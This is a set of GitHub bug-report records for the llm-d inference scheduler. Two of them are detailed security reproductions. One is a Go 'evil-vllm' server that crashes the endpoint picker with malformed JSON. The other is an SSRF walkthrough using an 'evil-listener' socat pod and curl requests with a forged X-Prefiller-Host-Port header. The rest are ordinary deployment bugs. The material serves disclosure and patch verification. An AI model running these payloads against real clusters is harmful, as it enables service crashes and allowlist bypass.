```

clone repo and build env-dev-kind

```
git clone https://github.com/llm-d/llm-d-inference-scheduler
cd llm-d-inference-scheduler
make env-dev-kind   # builds the EPP image from upstream main, creates kind cluster
```

We now have 3 containers running.  The tinyllama is the binary we're going to test

```
$ kubectl get deploy -n default
NAME                                       READY   UP-TO-DATE   AVAILABLE
inference-gateway-istio                    1/1     1            1
tinyllama-1-1b-chat-v1-0-endpoint-picker   1/1     1            1
vllm-d                                     1/1     1            1
```

Now create ```evil-vllm/main.go```:

```go
package main

import (
	"fmt"
	"net/http"
	"os"
)

const modelID = "TinyLlama/TinyLlama-1.1B-Chat-v1.0"

var vectors = map[string]string{
	"lc1": `{"id":"x","object":"chat.completion","model":"` + modelID + `","choices":[{"index":0,"message":{"role":"assistant","content":"hi"},"finish_reason":"stop"}],"usage":"oops"}`,
	"lc2": `{"id":"x","object":"chat.completion","model":"` + modelID + `","choices":[{"index":0,"message":{"role":"assistant","content":"hi"},"finish_reason":"stop"}],"usage":{"prompt_token_details":0}}`,
	"lc3": `{"id":"x","object":"chat.completion","model":"` + modelID + `","choices":[{"index":0,"message":{"role":"assistant","content":"hi"},"finish_reason":"stop"}],"usage":{"prompt_tokens":"1024"}}`,
}

func main() {
	vec := os.Getenv("PANIC_VECTOR")
	if vec == "" {
		vec = "lc1"
	}
	body, ok := vectors[vec]
	if !ok {
		fmt.Fprintf(os.Stderr, "unknown PANIC_VECTOR=%q (want lc1|lc2|lc3)\n", vec)
		os.Exit(2)
	}
	fmt.Fprintf(os.Stderr, "evil-vllm starting; PANIC_VECTOR=%s\n", vec)

	completions := func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, body)
	}
	http.HandleFunc("/v1/chat/completions", completions)
	http.HandleFunc("/v1/completions", completions)
	http.HandleFunc("/v1/models", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"object":"list","data":[{"id":%q,"object":"model"}]}`, modelID)
	})
	http.HandleFunc("/health", func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(200) })
	http.HandleFunc("/healthz", func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(200) })
	http.HandleFunc("/ready", func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(200) })
	_ = http.ListenAndServe(":8000", nil)
}
```

Create ```evil-vllm/Dockerfile```

```yaml
FROM golang:1.22-alpine AS build
WORKDIR /src
COPY main.go .
RUN go build -o /evil-vllm main.go

FROM gcr.io/distroless/base-debian12
COPY --from=build /evil-vllm /evil-vllm
EXPOSE 8000
ENTRYPOINT ["/evil-vllm"]
```

Build and load into kind
```bash
cd evil-vllm
docker build -t evil-vllm:dev .
kind load docker-image evil-vllm:dev --name llm-d-inference-scheduler-dev
cd ..
```

Swap the simulator container for evil-vllm and verify it's serving the payload:

```bash
kubectl patch deployment vllm-d -n default --type=strategic -p '{
  "spec": {"template": {"spec": {"containers": [{
    "name": "vllm",
    "image": "evil-vllm:dev",
    "imagePullPolicy": "Never",
    "command": ["/evil-vllm"],
    "args": [],
    "env": [{"name": "PANIC_VECTOR", "value": "lc1"}]
  }]}}}
}'
kubectl rollout status deployment/vllm-d -n default --timeout=60s
kubectl port-forward -n default deploy/vllm-d 18000:8000 &
sleep 3
curl -s -X POST http://localhost:18000/v1/chat/completions \
  -H 'Content-Type: application/json' -d '{}'
echo
kill %1
wait %1 2>/dev/null

```

We expect to see the malformed json
```
{"id":"x","object":"chat.completion","model":"TinyLlama/TinyLlama-1.1B-Chat-v1.0","choices":[{"index":0,"message":{"role":"assistant","content":"hi"},"finish_reason":"stop"}],"usage":"oops"}
```

Now we need to trigger the panic through the gateway, port forward to the gateway, and fire off our curl

```bash
EPP_POD=$(kubectl get pod -n default -o name | grep endpoint-picker | head -1 | cut -d/ -f2)
echo "EPP pod: $EPP_POD"
kubectl get pod $EPP_POD -n default -o jsonpath='{.status.containerStatuses[?(@.name=="epp")].restartCount}{"\n"}'

# Port-forward the gateway — it's a ClusterIP service (no NodePort by default)
kubectl port-forward -n default svc/inference-gateway-istio 18080:80 &
sleep 3

curl -s -o /dev/null -w "HTTP %{http_code}  time=%{time_total}s\n" -X POST http://localhost:18080/v1/chat/completions \
  -H 'Content-Type: application/json' \
  -d '{"model":"TinyLlama/TinyLlama-1.1B-Chat-v1.0","messages":[{"role":"user","content":"hi"}]}'
# Expected: HTTP 500

kill %1
wait %1 2>/dev/null

# kubelet surfaces --previous logs 15-30s after the crash
sleep 30
EPP_POD=$(kubectl get pod -n default --field-selector=status.phase=Running -o name | grep endpoint-picker | head -1 | cut -d/ -f2)
kubectl logs -n default $EPP_POD -c epp --previous --tail 80 | grep -A 25 '^panic:'

```

**Note:*** The RESTARTS count from ```kubectl get pods``` lags 15-30s behind actual crash.  Check --previous logs.  Also make sure to use the -c epp flag to avoid picking the wrong container.

There are two other ways I triggered this:

```bash
# LC-2: prompt_token_details non-map
kubectl set env deployment/vllm-d -n default PANIC_VECTOR=lc2
kubectl rollout status deployment/vllm-d -n default --timeout=60s
# Wait for EPP to come back to Ready after the previous LC-1 crash
kubectl wait --for=condition=Ready pod -l app.kubernetes.io/component=epp -n default --timeout=120s 2>/dev/null || sleep 30

# Re-trigger
kubectl port-forward -n default svc/inference-gateway-istio 18080:80 &
sleep 3
curl -s -o /dev/null -w "HTTP %{http_code}\n" -X POST http://localhost:18080/v1/chat/completions \
  -H 'Content-Type: application/json' \
  -d '{"model":"TinyLlama/TinyLlama-1.1B-Chat-v1.0","messages":[{"role":"user","content":"hi"}]}'
kill %1; wait %1 2>/dev/null

# Capture the panic stack
sleep 30
EPP_POD=$(kubectl get pod -n default --field-selector=status.phase=Running -o name | grep endpoint-picker | head -1 | cut -d/ -f2)
kubectl logs -n default $EPP_POD -c epp --previous --tail 80 | grep -A 8 '^panic:'
# Expect: panic at openai.go:260, "interface {} is float64, not map[string]interface {}"

# LC-3: prompt_tokens as string
kubectl set env deployment/vllm-d -n default PANIC_VECTOR=lc3
kubectl rollout status deployment/vllm-d -n default --timeout=60s
# Wait for EPP to come back to Ready after the previous LC-2 crash
kubectl wait --for=condition=Ready pod -l app.kubernetes.io/component=epp -n default --timeout=120s 2>/dev/null || sleep 30

# Re-trigger
kubectl port-forward -n default svc/inference-gateway-istio 18080:80 &
sleep 3
curl -s -o /dev/null -w "HTTP %{http_code}\n" -X POST http://localhost:18080/v1/chat/completions \
  -H 'Content-Type: application/json' \
  -d '{"model":"TinyLlama/TinyLlama-1.1B-Chat-v1.0","messages":[{"role":"user","content":"hi"}]}'
kill %1; wait %1 2>/dev/null

# Capture the panic stack
sleep 30
EPP_POD=$(kubectl get pod -n default --field-selector=status.phase=Running -o name | grep endpoint-picker | head -1 | cut -d/ -f2)
kubectl logs -n default $EPP_POD -c epp --previous --tail 80 | grep -A 8 '^panic:'
# Expect: panic at openai.go:289, "interface {} is string, not float64"
```

Make sure to cleanup after!

```bash
make clean-env-dev-kind   # deletes the kind cluster entirely
```

records.title: [Bug :bug:]: P/D sidecar allowlist stores only pod IP, not host:port
records.body:
### Contact Details

dan@kd2ycu.com

### What happened?

The P/D routing-sidecar's SSRF allowlist (`pkg/sidecar/proxy/allowlist.go`) doesn't enforce the port portion of `host:port` lookups. The allowlist stores only pod IPs (and pod names) — no port — and `IsAllowed` strips the port from the input before comparing. With `--enable-ssrf-protection=true`, an attacker with direct sidecar pod-network reach can send `X-Prefiller-Host-Port: <allowlisted-pod-ip>:<arbitrary-port>` and the sidecar will dial that arbitrary port on the allowlisted IP.

Triggering requires direct sidecar reach (the gateway/EPP path rewrites the header), and from that position the attacker can already `curl` any pod IP directly. The bug only matters in hardened deployments where NetworkPolicy or service-mesh identity grants the sidecar reach the attacker's pod doesn't have. The allowlist is documented as a security control and currently doesn't enforce its full stated scope.

While building a live-cluster reproduction, I hit a second prerequisite bug in the same file: `updatePodsForPool` (line 274) reads `spec.selector` flat instead of `spec.selector.matchLabels`, producing an invalid label set that the pod informer rejects. Net effect: with `--enable-ssrf-protection=true` the allowlist never populates and every request returns 403 — technically secure, but breaks the legitimate prefill path. Both fixes are bundled in a proposed patch (one file, 79 insertions / 35 deletions in `pkg/sidecar/proxy/allowlist.go`); I'll paste it as a follow-up comment.

Reproduced and patch-verified end-to-end on `kind-llm-d-inference-scheduler-dev` (mode `DISAGG_P=true`) against unmodified `ghcr.io/llm-d/llm-d-routing-sidecar:dev`. Pre-fix: the routing-sidecar dials an attacker-controlled port on an allowlisted pod and POSTs the prefill body to it (smoking-gun log captured). Post-fix: same request returns HTTP 403 ("Forbidden: prefill target not allowed").

### Version

3758ae0 (main, 54 commits past gaie-1.5-sync)

### Relevant log output

```shell
## BUG A: pool-selector parsing failure (allowlist never populates)

E0503 13:24:48.001622  1 reflector.go:204] "Failed to watch" err="failed to list *unstructured.Unstructured: unable to parse requirement: values[0][matchLabels]: Invalid value: \"map[app:tinyllama-1-1b-chat-v1-0-inference-pool]\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')" logger="UnhandledError"

## BUG B: allowlist contents (pre-fix) — bare hosts, no ports

{"level":"info","ts":1777816178.961367,"logger":"allowlist-validator","msg":"rebuilt allowlist","targetCount":6,"targets":{"10.244.0.11":{},"10.244.0.12":{},"10.244.0.7":{},"evil-listener":{},"vllm-d-64c6449c59-fnkr8":{},"vllm-p-8444b874cf-76d2z":{}}}

## BUG B: smoking gun: routing-sidecar dialed attacker-controlled :9090 and POSTed prefill body to evil-listener

> 2026/05/03 13:50:40.000671560  length=604 from=0 to=603
POST /v1/chat/completions HTTP/1.1
Host: 10.244.0.15:8000
User-Agent: curl/8.20.0
X-Prefiller-Host-Port: 10.244.0.12:9090       ← attacker-controlled port
X-Forwarded-For: 10.244.0.16
{"kv_transfer_params":{"do_remote_decode":true,...},"messages":[{"content":"hi","role":"user"}],...}

## POST-FIX with allowlist contents (host:port tuples)

{"level":"info","ts":1777816499.2655487,"logger":"allowlist-validator","msg":"rebuilt allowlist","targetCount":6,"targets":{"10.244.0.12:8000":{},"10.244.0.15:8000":{},"10.244.0.7:8000":{},"evil-listener:8000":{},"vllm-d-655d4ccb5c-9ndmg:8000":{},"vllm-p-8444b874cf-76d2z:8000":{}}}

## POST-FIX sigh same SSRF request → 403

HTTP 403
Forbidden: prefill target not allowed by SSRF protection
```

# STEPS TO REPRODUCE

Download pre-requisites
```bash
# Need: Docker (or Podman+compat), kind ≥ 0.20, kubectl, Go ≥ 1.22
docker --version && kind --version && kubectl version --client && go version
```

Clone the repo and bring up a P/D-disaggregation kind cluster:

```
git clone https://github.com/llm-d/llm-d-inference-scheduler
cd llm-d-inference-scheduler
DISAGG_P=true make env-dev-kind
```

After ~10–20 minutes, you should have four deployments. EPP shows CrashLoopBackoff because of an unrelated `feature gate 'prepareDataPlugins' is unknown` config issue — the LB-N1 demo bypasses the gateway entirely and connects to the routing-sidecar directly, so this doesn't block us.

```
$ kubectl get deploy -n default
NAME                                       READY   UP-TO-DATE   AVAILABLE
inference-gateway-istio                    1/1     1            1
tinyllama-1-1b-chat-v1-0-endpoint-picker   0/1     1            0   # ← unrelated upstream issue, ignore
vllm-d                                     1/1     1            1
vllm-p                                     1/1     1            1
```

Note the topology: `vllm-d` is the **decoder**, with the **`routing-sidecar`** sidecar/init container; `vllm-p` is the **prefiller**. Both pods are labelled `app: tinyllama-1-1b-chat-v1-0-inference-pool` (the InferencePool selector). The bug we're going to demonstrate is in the routing-sidecar's allowlist.

```
$ kubectl get pods -n default -l app=tinyllama-1-1b-chat-v1-0-inference-pool -o wide
NAME                      READY   STATUS    IP            NODE
vllm-d-66cd59fbd9-j5w8l   3/3     Running   10.244.0.8    llm-d-inference-scheduler-dev-control-plane
vllm-p-8444b874cf-76d2z   2/2     Running   10.244.0.7    llm-d-inference-scheduler-dev-control-plane
```

The dev cluster ships with `--enable-ssrf-protection` *off*. Turn it on for the routing-sidecar in `vllm-d` (the routing-sidecar is `initContainers[0]` because it uses Kubernetes 1.29+ native sidecars):

```bash
kubectl patch deployment vllm-d -n default --type=json -p='[
  {"op":"replace","path":"/spec/template/spec/initContainers/0/args","value":[
    "--port=8000",
    "--vllm-port=8200",
    "--kv-connector=nixlv2",
    "--secure-proxy=false",
    "--data-parallel-size=1",
    "--enable-ssrf-protection=true",
    "--inference-pool-namespace=default",
    "--inference-pool-name=tinyllama-1-1b-chat-v1-0-inference-pool"
  ]}
]'
kubectl rollout status deployment/vllm-d -n default --timeout=120s
```

The default ServiceAccount the sidecar runs under doesn't have InferencePool/Pod read perms — without them, the allowlist validator can't watch resources. Grant the perms and roll the deployment again so the sidecar picks them up:

```bash
cat <<'EOF' | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: routing-sidecar-allowlist
  namespace: default
rules:
  - apiGroups: ["inference.networking.k8s.io"]
    resources: ["inferencepools"]
    verbs: ["get", "list", "watch"]
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: routing-sidecar-allowlist
  namespace: default
subjects:
  - kind: ServiceAccount
    name: default
    namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: routing-sidecar-allowlist
EOF
kubectl rollout restart deployment/vllm-d -n default
kubectl rollout status   deployment/vllm-d -n default --timeout=120s
```

Now check the routing-sidecar logs. **You're expected to see a flood of `Invalid value: "map[app:..."` errors here — that's BUG A.** The allowlist watcher can't parse the InferencePool selector, so the allowlist remains empty:

```bash
VLLM_D=$(kubectl get pod -n default -l llm-d.ai/role=decode --field-selector=status.phase=Running -o name | head -1 | cut -d/ -f2)
kubectl logs -n default $VLLM_D -c routing-sidecar --tail 30 | grep -E 'allowlist|Invalid value' | head -5
```

Expected (this is the bug — it should NOT be happening):

```
{"level":"info","logger":"allowlist-validator","msg":"starting SSRF protection allowlist validator",...}
E0503 13:24:48 1 reflector.go:204] "Failed to watch" err="failed to list *unstructured.Unstructured: unable to parse requirement: values[0][matchLabels]: Invalid value: \"map[app:tinyllama-1-1b-chat-v1-0-inference-pool]\": ..."
E0503 13:24:49 1 reflector.go:204] "Failed to watch" err="..."
```

Apply the proposed patch (next, see follow-up comment), rebuild + reload the sidecar image, and roll the deployment:

```bash
git apply /path/to/patch.diff
make image-build-sidecar
kind load docker-image ghcr.io/llm-d/llm-d-routing-sidecar:dev --name llm-d-inference-scheduler-dev
kubectl rollout restart deployment/vllm-d -n default
kubectl rollout status   deployment/vllm-d -n default --timeout=120s
```

Re-check sidecar logs. The "Invalid value" errors should be gone, and the allowlist should now populate with **host:port tuples** (this is the BUG B fix taking effect):

```bash
VLLM_D=$(kubectl get pod -n default -l llm-d.ai/role=decode --field-selector=status.phase=Running -o name | head -1 | cut -d/ -f2)
kubectl logs -n default $VLLM_D -c routing-sidecar --tail 50 | grep 'rebuilt allowlist' | head -1
```

Expected:

```
{"level":"info","logger":"allowlist-validator","msg":"rebuilt allowlist","targetCount":4,"targets":{"10.244.0.7:8000":{},"10.244.0.8:8000":{},"vllm-d-...:8000":{},"vllm-p-...:8000":{}}}
```

Notice the `:8000` suffixes — host:port tuples, not bare hosts. This is the post-patch state.

Now to **demonstrate that the patch actually fixes BUG B**, we need to compare behavior before and after. Below we walk through the demo against unpatched code first (to show the SSRF firing), then re-run against the patched code.

To get back to the unpatched state (so we can see BUG B fire), revert the patch and rebuild:

```bash
git checkout -- pkg/sidecar/proxy/allowlist.go    # OR keep BUG A fix, see note below
make image-build-sidecar
kind load docker-image ghcr.io/llm-d/llm-d-routing-sidecar:dev --name llm-d-inference-scheduler-dev
kubectl rollout restart deployment/vllm-d -n default
kubectl rollout status   deployment/vllm-d -n default --timeout=120s
```

**Note:** if you `git checkout` the whole patch you'll re-introduce BUG A (allowlist never populates). To demonstrate BUG B in isolation you need the BUG A fix applied but BUG B reverted. The simplest approach is just to follow this whole repro in two passes — first against current `main` (BUG A blocks the demo), then apply the patch and verify both fixes. Alternatively, manually revert just the BUG B portion of the diff (the `addPodToAllowlist`, `IsAllowed`, `cachePoolPort`, `poolPorts` changes; keep the `updatePodsForPool` matchLabels fix).

Stand up an "evil-listener" pod with the InferencePool selector label. Its only job is to receive HTTP traffic and prove the SSRF connection happened — it listens on `:9090` (a non-prefiller port) and responds with `200 OK` so the sidecar accepts the response and the connection is logged.

Save as `evil-listener.yaml`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil-listener
  namespace: default
  labels:
    # The InferencePool's matchLabels selector — this label gets the pod
    # auto-included in the routing-sidecar's allowlist as if it were a
    # legitimate prefiller endpoint.
    app: tinyllama-1-1b-chat-v1-0-inference-pool
spec:
  containers:
    - name: ncat
      image: alpine
      command: ["sh","-c"]
      args:
        - |
          apk add --no-cache socat >/dev/null
          while true; do
            socat -v -v TCP-LISTEN:9090,reuseaddr,fork SYSTEM:'echo "HTTP/1.1 200 OK"; echo "Content-Type: application/json"; echo "Content-Length: 47"; echo; echo "{\"id\":\"x\",\"object\":\"chat.completion\",\"choices\":[]}"'
          done
      ports:
        - containerPort: 9090
```

Apply and confirm it's running with the right label:

```bash
kubectl apply -f evil-listener.yaml
sleep 5
kubectl get pod evil-listener -n default --show-labels
```

Expected:

```
NAME            READY   STATUS    RESTARTS   AGE   LABELS
evil-listener   1/1     Running   0          5s    app=tinyllama-1-1b-chat-v1-0-inference-pool
```

Confirm the routing-sidecar picked up evil-listener and added it to the allowlist (this is what makes the SSRF work — evil-listener's IP is treated as a legitimate prefiller endpoint):

```bash
VLLM_D=$(kubectl get pod -n default -l llm-d.ai/role=decode --field-selector=status.phase=Running -o name | head -1 | cut -d/ -f2)
kubectl logs -n default $VLLM_D -c routing-sidecar --tail 10 | grep 'rebuilt allowlist' | tail -1
```

Expected (against the unpatched sidecar, before BUG B fix):

```
{"msg":"rebuilt allowlist","targetCount":6,"targets":{"10.244.0.7":{},"10.244.0.8":{},"10.244.0.12":{},"evil-listener":{},"vllm-d-...":{},"vllm-p-...":{}}}
```

Note the absence of port suffixes — that's the BUG B data shape. `10.244.0.12` is evil-listener.

Capture target IPs and run the three test cases from an in-cluster attacker pod (the bug requires direct sidecar reach since EPP would otherwise rewrite `X-Prefiller-Host-Port` on the gateway path):

```bash
VLLM_D=$(kubectl get pod -n default -l llm-d.ai/role=decode --field-selector=status.phase=Running -o name | head -1 | cut -d/ -f2)
SIDECAR_IP=$(kubectl get pod $VLLM_D -n default -o jsonpath='{.status.podIP}')
PREFILLER_IP=$(kubectl get pod -n default -l llm-d.ai/role=prefill -o jsonpath='{.items[0].status.podIP}')
EVIL_IP=$(kubectl get pod evil-listener -n default -o jsonpath='{.status.podIP}')

echo "Sidecar:        $SIDECAR_IP:8000"
echo "Prefiller:      $PREFILLER_IP:8000"
echo "Evil listener:  $EVIL_IP:9090   (port 9090 — NOT a prefiller port)"

kubectl run attacker -n default --rm -i --restart=Never --image=curlimages/curl --quiet --command -- sh -c "
echo '#### Test 1: legit prefiller :8000 (control — should pass) ####'
curl -s -o /tmp/r1 -w 'HTTP %{http_code}\n' -X POST http://${SIDECAR_IP}:8000/v1/chat/completions \
    -H 'Content-Type: application/json' \
    -H 'X-Prefiller-Host-Port: ${PREFILLER_IP}:8000' \
    -d '{\"model\":\"TinyLlama/TinyLlama-1.1B-Chat-v1.0\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}' \
    --max-time 10
head -c 120 /tmp/r1; echo

echo
echo '#### Test 2: SSRF on :9090 (THE BUG) ####'
curl -s -o /tmp/r2 -w 'HTTP %{http_code}\n' -X POST http://${SIDECAR_IP}:8000/v1/chat/completions \
    -H 'Content-Type: application/json' \
    -H 'X-Prefiller-Host-Port: ${EVIL_IP}:9090' \
    -d '{\"model\":\"TinyLlama/TinyLlama-1.1B-Chat-v1.0\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}' \
    --max-time 10
head -c 200 /tmp/r2; echo

echo
echo '#### Test 3: non-allowlisted IP (control — should be 403) ####'
curl -s -o /tmp/r3 -w 'HTTP %{http_code}\n' -X POST http://${SIDECAR_IP}:8000/v1/chat/completions \
    -H 'Content-Type: application/json' \
    -H 'X-Prefiller-Host-Port: 10.244.99.99:8000' \
    -d '{\"model\":\"TinyLlama/TinyLlama-1.1B-Chat-v1.0\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}' \
    --max-time 10
head -c 200 /tmp/r3; echo
"
```

Expected against unpatched sidecar (this is what I observed):

```
#### Test 1: legit prefiller :8000 (control — should pass) ####
HTTP 200
{"id":"chatcmpl-d27e2759-20aa-5527-924e-9c302e4bae52","created":1777816573,"model":"TinyLlama/TinyLlama-1.1B-Chat-v1.0",...

#### Test 2: SSRF on :9090 (THE BUG) ####
HTTP 000

#### Test 3: non-allowlisted IP (control — should be 403) ####
HTTP 403
Forbidden: prefill target not allowed by SSRF protection
```

Test 2's `HTTP 000` looks like nothing happened at the client, but the bug already fired on the sidecar side. The sidecar dialed evil-listener at `:9090`, got back a fake "200 OK" body that didn't parse as a valid prefill response, and errored back to the client. The damage — a connection from the routing-sidecar's network identity to an attacker-controlled port — is already done.

Confirm the SSRF connection actually happened by reading evil-listener's logs:

```bash
kubectl logs evil-listener -n default --tail 30
```

Expected — note the routing-sidecar's POST arriving on port 9090 with the prefill request body intact:

```
> 2026/05/03 13:50:40.000671560  length=604 from=0 to=603
POST /v1/chat/completions HTTP/1.1
Host: 10.244.0.15:8000
User-Agent: curl/8.20.0
Content-Length: 305
X-Forwarded-For: 10.244.0.16
X-Prefiller-Host-Port: 10.244.0.12:9090       ← attacker-controlled port
X-Request-Id: 12833e0c-46f7-11f1-bd26-9e4fca54d14a
{"kv_transfer_params":{"do_remote_decode":true,...},"messages":[{"content":"hi","role":"user"}],...}
< 2026/05/03 13:50:40.000676068  length=67 from=0 to=66
HTTP/1.1 200 OK
```

That's the smoking gun: a pod the attacker controls (evil-listener) received a real prefill POST from the routing-sidecar's network identity, on a port that has no business being a prefiller port. The bug is fully demonstrated.

Now apply the patch (see follow-up comment) and re-run the demo:

```bash
git apply /path/to/patch.diff
make image-build-sidecar
kind load docker-image ghcr.io/llm-d/llm-d-routing-sidecar:dev --name llm-d-inference-scheduler-dev
kubectl rollout restart deployment/vllm-d -n default
kubectl rollout status   deployment/vllm-d -n default --timeout=120s
```

Verify the allowlist now contains host:port tuples:

```bash
VLLM_D=$(kubectl get pod -n default -l llm-d.ai/role=decode --field-selector=status.phase=Running -o name | head -1 | cut -d/ -f2)
kubectl logs -n default $VLLM_D -c routing-sidecar --tail 50 | grep 'rebuilt allowlist' | tail -1
```

Expected (note the `:8000` suffixes):

```
{"msg":"rebuilt allowlist","targetCount":6,"targets":{"10.244.0.7:8000":{},"10.244.0.12:8000":{},"evil-listener:8000":{},"vllm-p-...:8000":{},...}}
```

evil-listener is now allowlisted at `:8000` (the InferencePool's `targetPorts[0].number`), NOT `:9090`. So a request with `X-Prefiller-Host-Port: 10.244.0.12:9090` won't match.

Re-run the three test requests from the attacker pod (same `kubectl run attacker ...` block as above) — note we update `EVIL_IP` because rolling vllm-d may have changed pod IPs:

```bash
VLLM_D=$(kubectl get pod -n default -l llm-d.ai/role=decode --field-selector=status.phase=Running -o name | head -1 | cut -d/ -f2)
SIDECAR_IP=$(kubectl get pod $VLLM_D -n default -o jsonpath='{.status.podIP}')
PREFILLER_IP=$(kubectl get pod -n default -l llm-d.ai/role=prefill -o jsonpath='{.items[0].status.podIP}')
EVIL_IP=$(kubectl get pod evil-listener -n default -o jsonpath='{.status.podIP}')

kubectl run attacker -n default --rm -i --restart=Never --image=curlimages/curl --quiet --command -- sh -c "
echo '#### Test 1 (post-fix): legit prefiller (control) ####'
curl -s -o /tmp/r1 -w 'HTTP %{http_code}\n' -X POST http://${SIDECAR_IP}:8000/v1/chat/completions \
    -H 'Content-Type: application/json' \
    -H 'X-Prefiller-Host-Port: ${PREFILLER_IP}:8000' \
    -d '{\"model\":\"TinyLlama/TinyLlama-1.1B-Chat-v1.0\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}' \
    --max-time 10
head -c 120 /tmp/r1; echo

echo
echo '#### Test 2 (post-fix): SSRF on :9090 — should now be 403 ####'
curl -s -o /tmp/r2 -w 'HTTP %{http_code}\n' -X POST http://${SIDECAR_IP}:8000/v1/chat/completions \
    -H 'Content-Type: application/json' \
    -H 'X-Prefiller-Host-Port: ${EVIL_IP}:9090' \
    -d '{\"model\":\"TinyLlama/TinyLlama-1.1B-Chat-v1.0\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}' \
    --max-time 10
head -c 200 /tmp/r2; echo

echo
echo '#### Test 3 (post-fix): non-allowlisted IP (control) ####'
curl -s -o /tmp/r3 -w 'HTTP %{http_code}\n' -X POST http://${SIDECAR_IP}:8000/v1/chat/completions \
    -H 'Content-Type: application/json' \
    -H 'X-Prefiller-Host-Port: 10.244.99.99:8000' \
    -d '{\"model\":\"TinyLlama/TinyLlama-1.1B-Chat-v1.0\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}' \
    --max-time 10
head -c 200 /tmp/r3; echo
"
```

Expected after the patch:

```
#### Test 1 (post-fix): legit prefiller (control) ####
HTTP 200
{"id":"chatcmpl-...","created":...,"model":"TinyLlama/TinyLlama-1.1B-Chat-v1.0",...

#### Test 2 (post-fix): SSRF on :9090 — should now be 403 ####
HTTP 403
Forbidden: prefill target not allowed by SSRF protection

#### Test 3 (post-fix): non-allowlisted IP (control) ####
HTTP 403
Forbidden: prefill target not allowed by SSRF protection
```

Test 2 flipped from `HTTP 000` (sidecar dialed evil-listener:9090, got garbage, errored) to `HTTP 403` (sidecar refused to dial because `10.244.0.12:9090` doesn't match any allowlist entry). Tests 1 and 3 are unchanged.

Confirm evil-listener received no new connections after the patch:

```bash
kubectl logs evil-listener -n default --tail 5
```

Expected — the timestamps of the most recent log lines should still be from the *pre-fix* request; no new POST should have arrived.

**Note:** the routing-sidecar's `RESTARTS` counter stays at 0 throughout. This isn't a crash bug — it's a control-bypass bug. The signal is "what did evil-listener receive" and "what HTTP code did the attacker see," both of which flip cleanly across the patch boundary.

Make sure to cleanup after!

```bash
kubectl delete pod evil-listener -n default
kubectl delete role,rolebinding routing-sidecar-allowlist -n default
make clean-env-dev-kind   # deletes the kind cluster entirely
```

**Note:** [Bug found using the N184 Bug and Vulnerability Scanner](https://github.com/MillaFleurs/N184)

records.title: [Bug :bug:]: README quickstart references guides/optimized-baseline/, but that path doesn't exist in tag v0.6.0
records.body:
### Contact Details

wjackson@redhat.com

### What happened?

The repo `README.md` on the default branch (`main`) documents a quickstart that begins with:

```bash
export branch="main"  # branch, tag, or commit hash
git clone https://github.com/llm-d/llm-d.git && cd llm-d && git checkout ${branch}
```

…and later runs:

```bash
helm install ${GUIDE_NAME} \
    oci://registry.k8s.io/gateway-api-inference-extension/charts/standalone \
    -f guides/recipes/scheduler/base.values.yaml \
    -f guides/optimized-baseline/scheduler/optimized-baseline.values.yaml \
    -n ${NAMESPACE} --version ${GAIE_VERSION}
```

A reasonable reading of "branch, tag, or commit hash" is to substitute the latest **tagged release** (currently `v0.6.0`, published 2026-04-03). Doing so produces a clone in which neither `guides/optimized-baseline/` nor `guides/recipes/scheduler/` exists:

```bash
$ git clone --depth 1 --branch v0.6.0 https://github.com/llm-d/llm-d.git
$ ls llm-d/guides/
asynchronous-processing/   benchmark/   inference-scheduling/   pd-disaggregation/
precise-prefix-cache-aware/   predicted-latency-based-scheduling/   prereq/
QUICKSTART.md   README.md   recipes/   simulated-accelerators/
tiered-prefix-cache/   wide-ep-lws/   workload-autoscaling/

$ ls llm-d/guides/optimized-baseline/scheduler/optimized-baseline.values.yaml
ls: cannot access ...: No such file or directory
```

The `optimized-baseline` directory was added on `main` after the `v0.6.0` cut. The README quickstart only works when `branch=main`, which the README implies but does not state. A user pinning to the latest tagged release for reproducibility hits "No such file or directory" at the `helm -f ...` step.

### Expected behavior

One of:

1. **Pin the README example to a specific commit or tag** that contains the referenced paths, instead of letting `branch=main` be the implied default.
2. **State explicitly that the quickstart targets `main`** and that older tagged releases use a different directory structure (e.g. `inference-scheduling` instead of `optimized-baseline`).
3. **Backport the `optimized-baseline` reorganization to a tag** so following the README against the latest release works.

### Reproduction

```bash
git clone --depth 1 --branch v0.6.0 https://github.com/llm-d/llm-d.git
cd llm-d
ls guides/optimized-baseline/scheduler/optimized-baseline.values.yaml
# ls: cannot access ...: No such file or directory
```

### Workaround used

Pinned to a `main`-branch commit SHA (`83718227b22d` as of 2026-05-06) for our own validation. This is what we'd recommend the README do explicitly.

### Version

v0.6.0

### Relevant log output

```shell
$ helm install quickstart \
    oci://registry.k8s.io/gateway-api-inference-extension/charts/standalone \
    -f guides/recipes/scheduler/base.values.yaml \
    -f guides/optimized-baseline/scheduler/optimized-baseline.values.yaml \
    -n llm-d-quickstart --version v1.5.0

Error: open guides/recipes/scheduler/base.values.yaml: no such file or directory
```

records.title: [Bug :bug:]: optimized-baseline model server CrashLoopBackOff on OpenShift due to unwritable /.config and /.triton
records.body:
### Contact Details

wjackson@redhat.com

### What happened?

Following the README quickstart against an OpenShift 4.20 cluster (RHOAI 3.2 installed) using `vllm/vllm-openai:v0.19.1` (the upstream-pinned image in `guides/optimized-baseline/modelserver/gpu/vllm/kustomization.yaml`), the model server pod CrashLoopBackOffs at engine init. Logs show:

```
(EngineCore pid=84) PermissionError: [Errno 13] Permission denied: '/.config'
...
